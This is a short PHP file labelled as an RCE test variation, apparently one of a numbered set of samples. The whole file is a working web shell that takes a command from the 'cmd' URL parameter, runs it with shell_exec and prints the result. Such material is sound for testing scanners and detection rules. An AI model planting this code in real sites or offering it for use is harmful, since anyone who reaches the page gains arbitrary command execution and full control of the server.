<?php
// RCE test variation #1076
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>